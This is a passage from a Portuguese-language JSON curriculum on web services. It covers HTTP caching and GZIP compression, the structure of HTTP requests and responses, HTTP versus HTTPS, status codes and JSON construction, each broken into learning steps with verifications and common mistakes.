                                "tips: "
                              ],
                              "learningObjective": "Detectar e rotear dinamicamente por headers, promovendo APIs limpas sem poluição de URI.",
                              "commonMistakes": "Não validar headers corretamente levando a erros 406 Not Acceptable; ignorar cache de proxies."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.2.2"
                            ]
                          },
                          {
                            "id": "10.1.3.2.3.4",
                            "name": "Otimizar para escalabilidade com cache e compressão",
                            "description": "Configurar cabeçalhos de cache e GZIP em respostas HTTP para reduzir latência e banda em APIs de alto volume.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos de Cache HTTP e Compressão GZIP",
                                  "subSteps": [
                                    "Estude os cabeçalhos HTTP principais para cache: Cache-Control, ETag, Last-Modified e Expires.",
                                    "Aprenda como GZIP reduz o tamanho das respostas via compressão deflate.",
                                    "Identifique cenários de APIs de alto volume onde latência e banda são críticas.",
                                    "Revise RFC 7234 para cache e RFC 9110 para HTTP semântica.",
                                    "Compare cache público vs privado e max-age vs no-cache."
                                  ],
                                  "verification": "Resuma em um documento os 5 cabeçalhos principais e seus propósitos, com exemplos de uso.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre HTTP Cache",
                                    "RFC 7234 PDF",
                                    "Ferramenta online como httpstatus.io"
                                  ],
                                  "tips": "Use diagramas para visualizar o fluxo de cache no browser vs CDN.",
                                  "learningObjective": "Explicar como cache e GZIP impactam escalabilidade em APIs RESTful.",
                                  "commonMistakes": "Confundir Cache-Control: public com private; ignorar Vary header para compressão."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Compressão GZIP no Servidor de API",
                                  "subSteps": [
                                    "Instale middleware de compressão (ex: compression no Express.js).",
                                    "Configure para comprimir JSON, HTML e texto, excluindo imagens/binários.",
                                    "Adicione header Vary: Accept-Encoding para compatibilidade.",
                                    "Teste filtros personalizados para respostas > 1KB.",
                                    "Habilite brotli como fallback se suportado pelo servidor."
                                  ],
                                  "verification": "Envie requisição sem/with Accept-Encoding: gzip e confirme Content-Encoding: gzip via curl ou DevTools.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Node.js/Express app local",
                                    "npm package 'compression'",
                                    "Postman ou curl"
                                  ],
                                  "tips": "Monitore CPU usage durante compressão em loads altos.",
                                  "learningObjective": "Implementar GZIP para reduzir banda em 70%+ em payloads JSON.",
                                  "commonMistakes": "Comprimir tudo, incluindo já comprimidos; esquecer Vary header causando cache incorreto."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Cabeçalhos de Cache Adequados",
                                  "subSteps": [
                                    "Defina Cache-Control: public, max-age=3600 para recursos estáticos em APIs.",
                                    "Use ETag para validação condicional em endpoints dinâmicos.",
                                    "Configure Last-Modified baseado em timestamps de dados.",
                                    "Aplique no-cache para dados sensíveis ou mutáveis frequentemente.",
                                    "Integre com CDN como CloudFront para cache edge."
                                  ],
                                  "verification": "Inspecione headers de resposta no Network tab do Chrome DevTools; simule revalidação com If-None-Match.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Express.js middleware como 'apicache'",
                                    "Documentação Nginx/Apache para headers",
                                    "Browser DevTools"
                                  ],
                                  "tips": "Comece com max-age baixo (300s) e aumente baseado em padrões de acesso.",
                                  "learningObjective": "Configurar cache para reduzir requests ao origin server em 80%.",
                                  "commonMistakes": "Usar max-age infinito em dados voláteis; omitir s-maxage para proxies."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Otimizar Configurações de Cache e Compressão",
                                  "subSteps": [
                                    "Use ferramentas como Lighthouse ou WebPageTest para medir before/after.",
                                    "Simule load com Apache Bench ou Artillery para alto volume.",
                                    "Analise logs de cache hit/miss e tamanho de resposta.",
                                    "Ajuste thresholds baseados em métricas de latência e throughput.",
                                    "Valide cross-browser e mobile compatibilidade."
                                  ],
                                  "verification": "Gere relatório mostrando redução >50% em tamanho de payload e tempo de resposta.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Google Lighthouse",
                                    "Artillery.io para load testing",
                                    "Chrome DevTools Coverage tab"
                                  ],
                                  "tips": "Combine com minificação de JSON para ganhos compostos.",
                                  "learningObjective": "Medir e iterar otimizações para APIs escaláveis.",
                                  "commonMistakes": "Testar apenas com um request; ignorar cold starts em serverless."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Monitorar e Manter em Produção",
                                  "subSteps": [
                                    "Integre métricas com Prometheus/Grafana para cache ratio e compressão savings.",
                                    "Configure alerts para cache miss >20% ou compressão falhando.",
                                    "Atualize políticas baseadas em padrões de tráfego sazonal.",
                                    "Documente configurações em README para equipe.",
                                    "Teste invalidação de cache em updates de dados."
                                  ],
                                  "verification": "Deploy em staging e confirme métricas estáveis por 24h.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Datadog/New Relic",
                                    "CloudWatch se AWS",
                                    "GitHub repo para doc"
                                  ],
                                  "tips": "Use cache invalidation strategies como tag-based em CDNs.",
                                  "learningObjective": "Garantir otimizações sustentáveis em ambientes de produção.",
                                  "commonMistakes": "Não monitorar; assumir configs funcionam forever."
                                }
                              ],
                              "practicalExample": "Em uma API RESTful de e-commerce listando produtos (endpoint /api/products), configure GZIP para comprimir JSON de 50KB para 15KB e Cache-Control: public, max-age=1800 com ETag, reduzindo latência de 500ms para 100ms em 10k req/min.",
                              "finalVerifications": [
                                "Respostas incluem Content-Encoding: gzip quando solicitado.",
                                "Cabeçalhos Cache-Control/ETag presentes e corretos em DevTools.",
                                "Tamanho de payload reduzido em >60% via Network tab.",
                                "Revalidação condicional retorna 304 Not Modified.",
                                "Load test mostra throughput 2x maior sem aumento de latência.",
                                "Nenhum erro de cache poisoning em cenários multi-tenant."
                              ],
                              "assessmentCriteria": [
                                "Redução de 50-80% no tamanho médio de respostas comprimidas.",
                                "Cache hit rate >70% em testes de repetição.",
                                "Latência média <200ms em loads de 1000 req/s.",
                                "Compatibilidade com browsers antigos (IE11+ gzip).",
                                "Documentação clara de configs e métricas.",
                                "Zero falhas em validação de headers via ferramentas automatizadas."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender TCP throughput e latência de rede.",
                                "Banco de Dados: Cache de queries para reduzir DB load.",
                                "Segurança da Informação: Headers como Cache-Control: private para dados sensíveis.",
                                "Gestão de Projetos: Impacto de performance em SLAs e custos de infra."
                              ],
                              "realWorldApplication": "Empresas como Netflix usam cache ETag + GZIP em APIs de recomendação para servir milhões de users com baixa latência global; Google APIs aplicam compressão para economizar banda em mobile apps."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.2.1.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.3",
                    "name": "Protocolos e Formatos de Dados",
                    "description": "Uso de HTTP/HTTPS, JSON e XML na comunicação entre serviços web.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.3.1",
                        "name": "Protocolo HTTP/HTTPS",
                        "description": "O protocolo HTTP (HyperText Transfer Protocol) e sua versão segura HTTPS são fundamentais para a comunicação entre clientes e servidores na Internet, definindo a estrutura de requisições e respostas em serviços web.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.1.1",
                            "name": "Identificar componentes de uma requisição e resposta HTTP",
                            "description": "Reconhecer e descrever os elementos principais de uma requisição HTTP, incluindo método (GET, POST, PUT, DELETE), URL, headers (como Content-Type e Authorization), body e versão do protocolo, bem como a estrutura da resposta com status code, headers e body.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura geral de uma requisição HTTP",
                                  "subSteps": [
                                    "Ler a definição de requisição HTTP como uma mensagem enviada pelo cliente ao servidor.",
                                    "Visualizar a estrutura em três partes principais: linha de requisição, cabeçalhos (headers) e corpo (body).",
                                    "Identificar a linha de requisição inicial contendo método, URL e versão do protocolo.",
                                    "Diferenciar requisição de resposta HTTP.",
                                    "Observar exemplos simples em ferramentas de desenvolvedor do navegador."
                                  ],
                                  "verification": "Desenhar um diagrama anotado da estrutura geral de uma requisição HTTP e compará-lo com um exemplo real.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre HTTP",
                                    "Navegador com DevTools (Chrome/Firefox)",
                                    "Papel e caneta para diagrama"
                                  ],
                                  "tips": "Abra o DevTools (F12), vá para a aba Network e recarregue uma página para ver requests reais.",
                                  "learningObjective": "Reconhecer a composição básica de uma requisição HTTP e suas partes principais.",
                                  "commonMistakes": [
                                    "Confundir a linha de requisição com headers",
                                    "Ignorar a importância da versão do protocolo",
                                    "Pensar que body é sempre obrigatório"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar método, URL e versão do protocolo na requisição",
                                  "subSteps": [
                                    "Estudar métodos comuns: GET (recuperar dados), POST (enviar dados), PUT (atualizar), DELETE (remover).",
                                    "Analisar a URL: esquema (http/https), host, path, query parameters.",
                                    "Explicar a versão HTTP (ex: HTTP/1.1, HTTP/2) e sua relevância para compatibilidade.",
                                    "Praticar identificando esses elementos em uma requisição capturada no DevTools.",
                                    "Diferenciar URL absoluta de relativa em contextos de requisição."
                                  ],
                                  "verification": "Extrair e listar método, URL completa e versão de uma requisição real do DevTools.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "DevTools do navegador",
                                    "Exemplos de requisições em https://httpbin.org",
                                    "Notas de estudo"
                                  ],
                                  "tips": "Use sites como httpbin.org para testar requisições GET/POST sem servidor próprio.",
                                  "learningObjective": "Descrever precisamente o método, URL e versão em uma requisição HTTP.",
                                  "commonMistakes": [
                                    "Confundir query parameters com path",
                                    "Esquecer o esquema na URL",
                                    "Misturar versões HTTP com HTTPS"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar headers e body da requisição HTTP",
                                  "subSteps": [
                                    "Listar headers comuns: Content-Type (tipo de conteúdo), Authorization (autenticação), User-Agent.",
                                    "Explicar como headers são pares chave-valor enviados após a linha de requisição.",
                                    "Entender o body: dados enviados no POST/PUT, formatos como JSON, form-data.",
                                    "Identificar quando body é vazio (ex: GET).",
                                    "Inspecionar headers e body em uma requisição POST real."
                                  ],
                                  "verification": "Capturar uma requisição POST e anotar 3 headers principais e o conteúdo do body.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Postman ou Insomnia para simular requests",
                                    "DevTools",
                                    "Documentação sobre headers HTTP"
                                  ],
                                  "tips": "No Postman, envie uma request e examine a aba Headers e Body para prática rápida.",
                                  "learningObjective": "Reconhecer e descrever headers chave-valor e o propósito do body na requisição.",
                                  "commonMistakes": [
                                    "Confundir Content-Type com Content-Length",
                                    "Incluir body em requests GET",
                                    "Ignorar headers de segurança como CORS"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar componentes de uma resposta HTTP",
                                  "subSteps": [
                                    "Estudar a linha de status: versão HTTP, status code (ex: 200 OK, 404 Not Found), reason phrase.",
                                    "Classificar status codes: 2xx (sucesso), 4xx (erro cliente), 5xx (erro servidor).",
                                    "Analisar headers da resposta: Content-Type, Set-Cookie, Cache-Control.",
                                    "Examinar o body da resposta: dados retornados, geralmente JSON/XML/HTML.",
                                    "Comparar estrutura request vs response usando um exemplo completo."
                                  ],
                                  "verification": "Analisar uma resposta HTTP completa e listar status code, 3 headers e resumir o body.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta Postman",
                                    "API pública como JSONPlaceholder",
                                    "DevTools aba Network"
                                  ],
                                  "tips": "Filtre por status codes falhos no DevTools para praticar erros comuns.",
                                  "learningObjective": "Descrever todos os elementos principais de uma resposta HTTP.",
                                  "commonMistakes": [
                                    "Confundir status code com método",
                                    "Ignorar reason phrase",
                                    "Pensar que body da resposta é sempre JSON"
                                  ]
                                }
                              ],
                              "practicalExample": "Exemplo de Requisição GET: \nGET /api/users/1 HTTP/1.1\nHost: api.exemplo.com\nContent-Type: application/json\nAuthorization: Bearer token123\n\nResposta: \nHTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 45\n\n{\"id\":1,\"name\":\"João\",\"email\":\"joao@email.com\"}\n\nIdentifique: Método=GET, URL=/api/users/1, Headers=Content-Type/Authorization, Body=vazio na request; Status=200 OK, Headers=Content-Type/Content-Length, Body=JSON.",
                              "finalVerifications": [
                                "Listar corretamente método, URL, headers e body de uma requisição HTTP capturada.",
                                "Identificar status code, headers e body de uma resposta HTTP de exemplo.",
                                "Explicar diferenças entre request e response.",
                                "Classificar um status code em sua categoria (2xx, 4xx, 5xx).",
                                "Analisar uma requisição/resposta real usando DevTools sem erros.",
                                "Descrever o papel de headers como Content-Type e Authorization."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de todos os componentes (método, URL, versão, headers, body, status).",
                                "Correta explicação de pelo menos 3 headers comuns e seu propósito.",
                                "Classificação precisa de status codes e reason phrases.",
                                "Capacidade de analisar exemplos reais sem confusões entre request/response.",
                                "Uso correto de terminologia técnica (ex: query params vs path).",
                                "Demonstração prática via ferramentas como DevTools ou Postman."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender camada de aplicação no modelo OSI/TCP-IP.",
                                "Segurança da Informação: Headers de autenticação e prevenção de ataques como CSRF.",
                                "Desenvolvimento de Software: Integração com APIs RESTful em programação web.",
                                "Banco de Dados: Headers e body em requisições para serviços de dados.",
                                "Análise de Sistemas: Debugging de integrações cliente-servidor."
                              ],
                              "realWorldApplication": "No desenvolvimento de aplicações web, essa habilidade permite debugar falhas em APIs usando DevTools ou Postman, otimizar requests para performance (ex: cache headers), integrar serviços como autenticação OAuth e resolver erros comuns em integrações com backends, essencial para full-stack developers e analistas de sistemas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.1.2",
                            "name": "Explicar a diferença entre HTTP e HTTPS",
                            "description": "Compreender como o HTTPS adiciona uma camada de segurança via TLS/SSL, criptografando os dados em trânsito, protegendo contra interceptações, e identificar cenários onde HTTPS é obrigatório, como em comunicações sensíveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do Protocolo HTTP",
                                  "subSteps": [
                                    "Ler a definição oficial de HTTP como protocolo de aplicação para transferência de hipertexto",
                                    "Estudar o modelo request-response: cliente envia requisição, servidor responde",
                                    "Analisar que os dados são transmitidos em texto plano, sem criptografia",
                                    "Observar exemplos de cabeçalhos HTTP em ferramentas de desenvolvedor do navegador",
                                    "Identificar limitações de segurança do HTTP"
                                  ],
                                  "verification": "Explicar verbalmente ou por escrito o ciclo request-response do HTTP em 3 frases claras",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Navegador web com ferramentas de desenvolvedor (F12)",
                                    "Documentação MDN Web Docs sobre HTTP",
                                    "Vídeo introdutório no YouTube sobre HTTP basics"
                                  ],
                                  "tips": [
                                    "Use a analogia de uma conversa em voz alta em público para ilustrar a falta de privacidade",
                                    "Pratique capturando tráfego HTTP local para ver dados em claro"
                                  ],
                                  "learningObjective": "Definir HTTP, seu funcionamento básico e ausência de criptografia",
                                  "commonMistakes": [
                                    "Confundir HTTP com HTML (protocolo vs linguagem de marcação)",
                                    "Achar que HTTP é sempre seguro por ser 'padrão da web'"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o HTTPS e a Camada TLS/SSL",
                                  "subSteps": [
                                    "Estudar HTTPS como HTTP sobre TLS/SSL para criptografia",
                                    "Aprender o processo de handshake TLS: negociação de chaves e certificados",
                                    "Entender como a criptografia simétrica e assimétrica protege os dados em trânsito",
                                    "Visualizar o ícone de cadeado no navegador como indicador de HTTPS",
                                    "Diferenciar certificados SSL válidos de autoassinados"
                                  ],
                                  "verification": "Desenhar um diagrama simples do handshake TLS e descrever suas fases principais",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Site como https://www.ssllabs.com/ssltest/ para análise de certificados",
                                    "Documentação sobre TLS 1.3 da IETF",
                                    "Ferramenta Wireshark para observar tráfego criptografado"
                                  ],
                                  "tips": [
                                    "Lembre-se: TLS é o sucessor moderno do SSL; foque em TLS 1.2/1.3",
                                    "Teste acessando sites HTTP e HTTPS para comparar velocidades e segurança"
                                  ],
                                  "learningObjective": "Explicar como HTTPS usa TLS/SSL para adicionar criptografia ao HTTP",
                                  "commonMistakes": [
                                    "Confundir SSL com um protocolo separado (é TLS/SSL)",
                                    "Ignorar a importância da validação de certificados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar HTTP e HTTPS em Detalhes",
                                  "subSteps": [
                                    "Listar diferenças chave: porta (80 vs 443), criptografia (ausente vs presente), segurança",
                                    "Simular ataques como man-in-the-middle (MITM) em HTTP vs proteção em HTTPS",
                                    "Analisar impactos em performance (overhead mínimo do HTTPS moderno)",
                                    "Identificar quando browsers bloqueiam HTTP (HSTS)",
                                    "Comparar em tabela: prós, contras e usos"
                                  ],
                                  "verification": "Criar uma tabela comparativa com pelo menos 5 diferenças entre HTTP e HTTPS",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Editor de texto ou Google Sheets para tabela",
                                    "Artigo 'HTTP vs HTTPS' da Cloudflare",
                                    "Extensão browser como HTTPS Everywhere"
                                  ],
                                  "tips": [
                                    "Use cores na tabela: verde para HTTPS seguro, vermelho para HTTP vulnerável",
                                    "Teste redirecionamentos HTTP para HTTPS em sites reais"
                                  ],
                                  "learningObjective": "Comparar precisamente HTTP e HTTPS, destacando ganhos de segurança",
                                  "commonMistakes": [
                                    "Subestimar overhead do HTTPS (é negligible hoje com HTTP/2+)",
                                    "Pensar que HTTPS protege contra todos os ataques (apenas em trânsito)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Cenários de Uso Obrigatório do HTTPS",
                                  "subSteps": [
                                    "Listar contextos sensíveis: login, pagamentos, dados pessoais",
                                    "Estudar políticas como PCI-DSS para e-commerce e GDPR para privacidade",
                                    "Analisar SEO: Google prioriza HTTPS em rankings",
                                    "Verificar obrigações legais em apps web (ex: browsers forçam HTTPS)",
                                    "Planejar migração de HTTP para HTTPS em um projeto hipotético"
                                  ],
                                  "verification": "Descrever 3 cenários onde HTTPS é obrigatório e por quê, com exemplos reais",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Lista de requisitos PCI-DSS",
                                    "Documentação Google sobre HTTPS ranking",
                                    "Ferramenta Let's Encrypt para certificados grátis"
                                  ],
                                  "tips": [
                                    "Sempre verifique o cadeado e 'Não Seguro' no browser",
                                    "Pratique obtendo certificado gratuito para testar"
                                  ],
                                  "learningObjective": "Reconhecer quando e por quê HTTPS é essencial em aplicações reais",
                                  "commonMistakes": [
                                    "Usar HTTPS só para 'coisas importantes' (use sempre)",
                                    "Ignorar mixed content (HTTP em página HTTPS)"
                                  ]
                                }
                              ],
                              "practicalExample": "Acesse http://example-http.com (simulado inseguro) em dev tools para ver dados em texto plano, como uma senha '123456'. Agora acesse https://example-https.com: observe o cadeado, tente inspecionar – dados criptografados. Simule MITM com Wireshark: HTTP revela tudo, HTTPS oculta.",
                              "finalVerifications": [
                                "Explicar a diferença HTTP/HTTPS em 1 minuto sem notas",
                                "Identificar HTTPS em 5 sites aleatórios pelo ícone/cadeado",
                                "Desenhar fluxo de dados HTTP vs HTTPS",
                                "Listar 3 ataques prevenidos por HTTPS",
                                "Migrar um site local de HTTP para HTTPS com certificado self-signed",
                                "Explicar handshake TLS em termos simples"
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição da criptografia TLS/SSL",
                                "Correta identificação de vulnerabilidades do HTTP (ex: eavesdropping)",
                                "Menção a cenários obrigatórios (pagamentos, logins)",
                                "Uso de exemplos práticos e analogias claras",
                                "Compreensão de impactos reais (SEO, conformidade legal)",
                                "Capacidade de comparar performance e segurança"
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Criptografia e autenticação",
                                "Redes de Computadores: Protocolos de camada aplicação e transporte",
                                "Desenvolvimento Web: Implementação em front-end/back-end",
                                "Ética e Privacidade: Proteção de dados usuários (LGPD/GDPR)",
                                "Matemática: Conceitos básicos de criptografia assimétrica"
                              ],
                              "realWorldApplication": "Em e-commerces como Mercado Livre ou bancos como Itaú, HTTPS protege cartões de crédito e senhas contra interceptações em Wi-Fi público; navegadores como Chrome marcam HTTP como 'Não Seguro', impactando confiança e SEO; desenvolvedores usam Let's Encrypt para migrações gratuitas, atendendo PCI-DSS e evitando multas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.1.3",
                            "name": "Interpretar códigos de status HTTP",
                            "description": "Analisar e explicar os principais códigos de status HTTP, como 200 (OK), 404 (Not Found), 500 (Internal Server Error), e categorizá-los em famílias (1xx, 2xx, 3xx, 4xx, 5xx) para depuração de serviços web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura e famílias dos códigos de status HTTP",
                                  "subSteps": [
                                    "Estude a composição de um código HTTP: primeiro dígito indica a classe (1xx a 5xx), os três dígitos formam o código específico.",
                                    "Memorize as cinco famílias principais: 1xx (Informativo), 2xx (Sucesso), 3xx (Redirecionamento), 4xx (Erro do Cliente), 5xx (Erro do Servidor).",
                                    "Leia a documentação oficial da RFC 9110 sobre status codes para contexto histórico e semântica.",
                                    "Crie um diagrama mental ou tabela resumindo cada família com exemplos iniciais.",
                                    "Discuta com um colega ou anote diferenças entre famílias de sucesso e erro."
                                  ],
                                  "verification": "Crie uma tabela com as 5 famílias, descrições e pelo menos um exemplo por família; revise se cobre todas as classes corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação RFC 9110 (https://datatracker.ietf.org/doc/html/rfc9110), papel ou ferramenta como Draw.io para diagrama.",
                                  "tips": "Use mnemônicos: 2xx 'Tudo bem', 4xx 'Culpa sua', 5xx 'Culpa do servidor'.",
                                  "learningObjective": "Identificar e categorizar corretamente as famílias de códigos HTTP.",
                                  "commonMistakes": "Confundir 3xx com erros (são redirecionamentos) ou ignorar 1xx como irrelevantes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Memorizar e analisar códigos de status comuns",
                                  "subSteps": [
                                    "Liste e estude 200 OK, 201 Created, 204 No Content (2xx); 301 Moved Permanently, 302 Found (3xx); 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found (4xx); 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable (5xx).",
                                    "Para cada código, leia definições oficiais e cenários de uso.",
                                    "Crie flashcards com código no frente e explicação no verso.",
                                    "Agrupe códigos por família em uma planilha com colunas: Código, Nome, Descrição, Causa comum.",
                                    "Teste-se recitando 10 códigos comuns sem olhar."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito 8 códigos comuns, incluindo pelo menos 2 de cada família principal (exceto 1xx).",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Flashcards (Anki app ou papel), planilha Google Sheets, MDN Web Docs HTTP Status Codes (https://developer.mozilla.org/en-US/docs/Web/HTTP/Status).",
                                  "tips": "Associe códigos a imagens: 404 como 'porta trancada', 500 como 'servidor explodindo'.",
                                  "learningObjective": "Explicar o significado e causas de pelo menos 15 códigos HTTP comuns.",
                                  "commonMistakes": "Confundir 401 (autenticação) com 403 (autorização) ou achar que 302 é permanente."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Praticar inspeção de códigos HTTP em ferramentas reais",
                                  "subSteps": [
                                    "Abra DevTools do navegador (F12) e acesse sites variados, observando Network tab para status codes.",
                                    "Use curl no terminal: 'curl -I https://example.com' para cabeçalhos e status.",
                                    "Simule erros: acesse URLs inválidas (404), sites com SSL inválido ou APIs sem chave (401/403).",
                                    "Registre 10 respostas reais em um log com código, URL e interpretação.",
                                    "Compare respostas de diferentes sites (ex: Google vs. site local)."
                                  ],
                                  "verification": "Log com 10 entradas de status codes reais, cada uma com interpretação categorizada e explicada.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Navegador Chrome/Firefox com DevTools, terminal com curl instalado, sites de teste como httpbin.org/status/404.",
                                  "tips": "Filtre Network tab por 'XHR' para focar em APIs; use -v em curl para verbose output.",
                                  "learningObjective": "Identificar códigos HTTP em ferramentas de depuração e interpretá-los no contexto.",
                                  "commonMistakes": "Ignorar redirecionamentos automáticos (use --location em curl) ou confundir status de redirects."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar interpretação na depuração de serviços web",
                                  "subSteps": [
                                    "Crie um cenário de depuração: liste sintomas e associe a códigos prováveis (ex: página não carrega → 5xx).",
                                    "Desenvolva um fluxograma de troubleshooting baseado em famílias de códigos.",
                                    "Teste em um serviço real: chame uma API pública (ex: JSONPlaceholder) e force erros.",
                                    "Escreva um relatório de depuração para um código 500 simulado.",
                                    "Revise fluxograma com pares para feedback."
                                  ],
                                  "verification": "Produza um fluxograma ou relatório de depuração cobrindo 3 cenários comuns com códigos apropriados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ferramenta de fluxograma (Lucidchart ou papel), Postman ou Insomnia para APIs, JSONPlaceholder (https://jsonplaceholder.typicode.com).",
                                  "tips": "Sempre cheque logs do servidor após 5xx; para 4xx, valide requests primeiro.",
                                  "learningObjective": "Usar códigos HTTP para guiar processos de depuração eficazes.",
                                  "commonMistakes": "Pular verificação de cliente antes de culpar servidor em 5xx."
                                }
                              ],
                              "practicalExample": "Ao desenvolver uma API em Node.js, ao testar POST /users com dados inválidos via Postman, recebe 400 Bad Request. Interprete: família 4xx (erro cliente), causa: validação falhou. Corrija payload e reteste para 201 Created.",
                              "finalVerifications": [
                                "Liste e categorize corretamente todas as 5 famílias de status codes.",
                                "Explique 10 códigos comuns com exemplos de uso.",
                                "Use DevTools ou curl para capturar e interpretar 5 status codes reais.",
                                "Crie um fluxograma de depuração baseado em códigos HTTP.",
                                "Identifique causas prováveis para cenários como 'página não encontrada' ou 'serviço indisponível'.",
                                "Diferencie autenticação (401) de autorização (403) em um exemplo prático."
                              ],
                              "assessmentCriteria": [
                                "Precisão na categorização de famílias (100% correto).",
                                "Profundidade de explicações para códigos comuns (detalhes causais e resolutivos).",
                                "Evidências práticas de uso de ferramentas (screenshots ou logs).",
                                "Criatividade e clareza no fluxograma de depuração.",
                                "Capacidade de ligar códigos a cenários reais de depuração.",
                                "Ausência de confusões comuns entre códigos similares."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender camadas HTTP no modelo OSI/TCP/IP.",
                                "Programação Web: Integração com fetch/axios em JavaScript para handling de status.",
                                "Segurança da Informação: Análise de 401/403 em contextos de autenticação OAuth/JWT.",
                                "Banco de Dados: 5xx relacionados a falhas de query ou overload.",
                                "Design de UX: Usar 3xx para redirecionamentos seamless em SPAs."
                              ],
                              "realWorldApplication": "Em desenvolvimento de APIs RESTful, depuração de integrações frontend-backend, monitoramento com ferramentas como New Relic ou ELK Stack, onde identificar 502/503 permite escalar servidores rapidamente, reduzindo downtime em e-commerces ou apps SaaS."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.3.2",
                        "name": "Formato de Dados JSON",
                        "description": "JSON (JavaScript Object Notation) é um formato leve, legível e amplamente utilizado para serialização de dados em APIs RESTful e comunicação assíncrona entre serviços web.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.2.1",
                            "name": "Construir e validar estruturas JSON",
                            "description": "Criar objetos JSON válidos com tipos de dados suportados (string, number, boolean, array, object), aninhamentos e escapar caracteres especiais, utilizando ferramentas como validadores online para verificar sintaxe.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os tipos de dados básicos em JSON",
                                  "subSteps": [
                                    "Leia a especificação oficial de tipos: string (texto entre \" \"), number (inteiros/decimais), boolean (true/false), array ([]), object ({}), null.",
                                    "Anote exemplos para cada tipo: \"nome\": \"João\", \"idade\": 25, \"ativo\": true, \"hobbies\": [\"leitura\", \"esporte\"], \"endereco\": {\"rua\": \"Av Principal\"}, \"salario\": null.",
                                    "Compare com linguagens de programação: note semelhanças com objetos JS ou dicionários Python.",
                                    "Pratique identificando tipos em exemplos existentes.",
                                    "Memorize regras: sem aspas simples, números sem aspas, case-sensitive."
                                  ],
                                  "verification": "Crie uma tabela listando os 6 tipos com 1 exemplo válido cada e valide manualmente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Site json.org",
                                    "Editor de texto como VS Code ou Notepad++"
                                  ],
                                  "tips": "Sempre use aspas duplas para strings e chaves; evite comentários (não suportados em JSON).",
                                  "learningObjective": "Identificar e exemplificar corretamente todos os tipos de dados JSON suportados.",
                                  "commonMistakes": [
                                    "Usar aspas simples para strings.",
                                    "Colocar aspas em números ou booleans.",
                                    "Esquecer vírgulas entre itens."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Construir objetos JSON simples",
                                  "subSteps": [
                                    "Abra um editor de texto e crie um objeto raiz {} vazio.",
                                    "Adicione propriedades básicas: string, number e boolean, separadas por vírgula.",
                                    "Exemplo: { \"nome\": \"Maria\", \"idade\": 30, \"casada\": false }.",
                                    "Teste salvando como .json e abrindo em um editor que destaque sintaxe.",
                                    "Adicione uma propriedade null para praticar."
                                  ],
